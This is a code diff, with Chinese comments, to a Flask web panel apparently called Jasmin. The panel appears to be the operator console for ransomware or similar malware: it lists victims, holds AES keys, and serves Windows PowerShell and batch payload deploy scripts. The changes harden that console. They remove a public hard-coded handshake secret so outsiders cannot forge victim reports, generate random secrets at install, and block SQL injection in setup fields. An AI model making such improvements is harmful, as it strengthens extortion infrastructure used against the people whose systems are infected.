@@ -60,6 +60,34 @@ def _verify_password(stored_hash, password):
         return _bcrypt.checkpw(password.encode('utf-8'), h.encode('utf-8'))
     return check_password_hash(h, password)
 
+def _load_dotenv(path=None):
+    """加载 Web Panel Python/.env，与 PHP 端 includes/env.php 行为对齐。
+
+    ★ 缺陷背景：此前 Python 面板完全不读 .env，配置只能来自 config.json 或
+      进程环境变量。两个后果：
+        1) TRUST_PROXY / GIT_TOKEN 等写在 .env 里不生效 —— 私有仓库更新检查失效；
+        2) 握手密钥在 config.json 与进程环境变量都缺失时，回落到源码里硬编码的
+           'jasmin@123'（该值公开可查，等于任何人都能伪造受害者上报）。
+      真实环境变量优先，不被 .env 覆盖。
+    """
+    path = path or os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
+    if not os.path.isfile(path):
+        return
+    try:
+        with open(path, encoding='utf-8') as fh:
+            for line in fh:
+                line = line.strip()
+                if not line or line.startswith('#') or '=' not in line:
+                    continue
+                k, v = line.split('=', 1)
+                k, v = k.strip(), v.strip()
+                if k and k not in os.environ:
+                    os.environ[k] = v
+    except Exception:
+        pass
+
+_load_dotenv()
+
 app = Flask(__name__)
 
 # nginx 只设 X-Forwarded-For / X-Real-IP，不启用 ProxyFix 的话
@@ -154,7 +182,10 @@ app.secret_key = _sk
 db_url = cfg.get('database_url', os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db'))
 app.config['SQLALCHEMY_DATABASE_URI'] = db_url
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret', os.environ.get('HANDSHAKE_SECRET', 'jasmin@123'))
+# ★ 修复：去掉硬编码兜底 'jasmin@123'。该值公开在源码/上游仓库中，任何人都能
+#   用它伪造受害者上报。现按 优先级 config.json > 环境变量/.env > 空 取值；
+#   取不到时握手路由会返回 503（失败闭合），与 PHP 端 handshake.php 的行为一致。
+app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret') or os.environ.get('HANDSHAKE_SECRET') or ''
 
 # Redis session (集群模式)
 redis_host = cfg.get('redis_host', os.environ.get('REDIS_HOST', ''))
@@ -275,7 +306,9 @@ def install():
             name = (request.form.get('db_name','jasmin_db') or '').strip()
             user = (request.form.get('db_user','') or '').strip()
             pw = request.form.get('db_pass','') or ''
-            secret = request.form.get('secret','jasmin@123')
+            # ★ 修复：原为 request.form.get('secret','jasmin@123') —— 安装时若留空，
+            #   握手密钥就落成源码里公开的硬编码值。现留空则生成随机密钥。
+            secret = (request.form.get('secret') or '').strip() or secrets.token_urlsafe(24)
             # 入参校验：库名会被直接拼进 CREATE DATABASE 语句（反引号可逃逸 => SQL 注入），
             # 其余字段会拼进连接串（@ : / ? 会改变 URL 语义）。PHP 侧一直有白名单，这里补齐。
             if not re.fullmatch(r'[A-Za-z0-9_]{1,64}', name):
@@ -566,6 +599,8 @@ def dashboard():
     return render_template('dashboard.html', victims=victims, page=page,
         total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION,
         aes_key=aes_key, has_active=has_active, has_key=has_key, key_fp=key_fp,
+        # 传给载荷生成表单，避免模板里写死默认密钥
+        handshake_secret=app.config['HANDSHAKE_SECRET'],
         win_deploy_ps=_WIN_DEPLOY_PS, win_deploy_bat=_WIN_DEPLOY_BAT)
 
 # ── Handshake ──
